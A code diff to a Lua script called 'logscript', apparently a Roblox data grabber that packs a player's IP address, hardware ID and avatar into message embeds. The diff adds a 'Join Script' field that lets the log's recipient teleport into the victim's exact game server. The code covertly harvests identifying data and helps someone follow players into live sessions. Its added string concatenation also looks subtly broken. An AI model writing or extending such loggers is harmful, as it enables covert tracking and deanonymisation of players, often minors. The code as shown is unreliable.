@@ -13,6 +13,7 @@ local logscript = {
   IPAddress = true,
   RobloxHWID = true,
   AvatarThumbnail = true,
+  JoinScript = true
 }
 
 function logscript:Load()
@@ -111,6 +112,14 @@ function logscript:Load()
     table.insert(PlayerData["embeds"][1]["fields"], {
       ["name"] = "Roblox HWID:",
       ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+      ["inline"] = true
+    })
+  end
+
+  if logscript.JoinScript then
+    table.insert(PlayerData["embeds"][1]["fields"], {
+      ["name"] = "Join Script:",
+      ["value"] = '```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId', '..game.JobId', game.Players.LocalPlayer)\n```',
       ["inline"] = true
     })
   end
